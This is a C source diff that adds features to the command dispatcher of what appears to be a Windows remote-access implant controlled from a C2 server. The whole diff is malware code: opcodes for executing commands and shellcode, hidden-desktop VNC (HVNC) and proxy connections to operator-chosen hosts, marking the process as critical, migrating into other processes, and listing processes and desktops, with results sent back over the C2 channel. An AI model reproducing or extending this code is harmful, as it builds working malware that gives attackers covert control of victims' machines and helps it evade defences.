@@ -10,8 +10,13 @@
 #include "hackmods/injectors.h"
 #include "hackmods/bof.h"
 #include "hackmods/unhook.h"
+#include "hackmods/critlib.h"
 #include "vnc/vnc.h"
-#include "hvnc/hvnc.h"
+#include "vnc/hvnc.h"
+#include "utils/desktops.h"
+#include "modules/proxy.h"
+#include "migrate.h"
+#include "utils/ps.h"
 #define pstr(x) printf("len=%d, data=%.*s\n", x.len, x.len, x.data)
 #define fs(x) free(x.data)
 
@@ -19,7 +24,6 @@ enum Opcodes{
     PRINT, //1//print [text]
     MSGBOX, //2//msgbox [title] [content]
     POPINT, //0
-    POPSTR, //0
     CONSUME, //0
     EXEC, //r1//exec [command]
     EXIT, //0
@@ -35,9 +39,21 @@ enum Opcodes{
     UNHOOK, //0//auto remove hooks
     VNC, //2//vnc [ip] [port]
     HVNC, //2//hvnc [ip] [port]
+    CRITICAL, //1//critical [true/false]
+    ENUMDESKTOPS, //0
+    SETWINSTA, //1//setwinsta [station]
+    SETTHDDSK, //1//setthddsk [desktop]
+    GETTHDDSK, //0
+    PUSHINT, //0
+    PUSHSTR, //0
+    PROXY, //2//proxy [ip] [port]
+    KILLPROXY, //1//killproxy [id]
+    MIGRATE, //1//migrate [pid]
+    PS, //0//list processes
+    CURRENTPID, //0
 };
 
-int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
+int parse(int mnem, unsigned char** sp, C2* conn){
     if(mnem == MSGBOX){
         String title = popstr(sp);
         String body = popstr(sp);
@@ -53,6 +69,8 @@ int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
         out.data = calloc(10000, 1);
         out.len = exec(in.data, out.data, in.len);
         pushstr(out, sp);
+        fs(in);
+        fs(out);
     }else if(mnem == SLEEP){
         Sleep(popint(sp));
     }else if(mnem == LOCAL_SHC){
@@ -100,6 +118,7 @@ int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
         NETWORK* net = calloc(sizeof(NETWORK), 1);
         net->ip = data.data;
         net->port = popint(sp);
+        
         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)vncspawn, net, 0, NULL);
     }else if(mnem == HVNC){
         String data = popstr(sp);
@@ -107,6 +126,54 @@ int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
         net->ip = data.data;
         net->port = popint(sp);
         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hvnc, net, 0, NULL);
+    }else if(mnem == PROXY){
+        String data = popstr(sp);
+        PROXOBJ* net = calloc(sizeof(PROXOBJ), 1);
+        net->ip = data.data;
+        net->port = popint(sp);
+        int i = 0;
+        net->alive = gethole(&i);
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)newproxy, net, 0, NULL);
+        char datum[100] = {0};
+        sprintf(datum, "Spawned proxy #%d!", i);
+        sendC2(*conn, datum, strlen(datum));
+    }else if(mnem == CRITICAL){
+        setCritical(popint(sp));
+    }else if(mnem == ENUMDESKTOPS){
+        getdesktops();
+        char desks[1000] = {0};
+        for(int i=0;i<(sizeof(desktops)/sizeof(char*));i++){
+            if(desktops[i]!=0){
+                strcat(desks, desktops[i]);
+                desks[strlen(desks)] = '\n';
+            }
+        }
+        sendC2(*conn, desks, strlen(desks));
+    }else if(mnem == SETWINSTA){
+        String data = popstr(sp);
+        setWinSta(data.data);
+        fs(data);
+    }else if(mnem == SETTHDDSK){
+        String data = popstr(sp);
+        memset(current_dsk, 0, MAX_PATH);
+        memcpy(current_dsk, data.data, data.len);
+        setThdDsk();
+        fs(data);
+    }else if(mnem == GETTHDDSK){
+        getcurrdesktop();
+        sendC2(*conn, current_dsk, strlen(current_dsk));
+    }else if(mnem == KILLPROXY){
+        proxies[popint(sp)] = 0;
+    }else if(mnem == MIGRATE){
+        migrate(popint(sp));
+    }else if(mnem == PS){
+        char* data = enumProcesses();
+        sendC2(*conn, data, strlen(data));
+        free(data);
+    }else if(mnem == CURRENTPID){
+        char data[100] = {0};
+        sprintf(data, "PID: %d", GetCurrentProcessId());
+        sendC2(*conn, data, strlen(data));
     }else{
         return 1;
     }
